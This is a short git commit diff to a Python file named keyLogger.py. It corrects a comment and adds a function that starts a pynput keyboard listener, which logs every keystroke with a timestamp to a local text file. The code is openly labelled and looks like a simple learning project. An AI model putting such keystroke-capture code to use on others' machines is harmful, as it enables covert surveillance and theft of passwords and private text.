ad272a9517ec0c398f79cfcddcd8677e59b3bc9b
VigneshVinnu <167983731+Vinnu-vignesh@users.noreply.github.com>
2025-07-13 12:21:32 -0400

    Update keyLogger.py

--- keyLogger.py
+++ keyLogger.py
@@ -3,7 +3,7 @@ from pynput import keyboard
 import os
 from datetime import datetime
 
-# Creating a log file in which all the captured key stroks are stored in it...
+# Creating a log file in which all the captured keystrokes are stored in it...
 LOG_FILE = "logs/keystrokes.txt"
 
 def writeToFile(key):
@@ -12,3 +12,9 @@ def writeToFile(key):
             f.write(f"{datetime.now()} - {key.char}\n")
         except AttributeError:
             f.write(f"{datetime.now()} - {key}\n")
+def startKeyLogger():
+    if not os.path.exists("logs"):
+        os.makedirs("logs")
+    with keyboard.Listener(on_press=writeToFile) as listener:
+        listener.join()
+
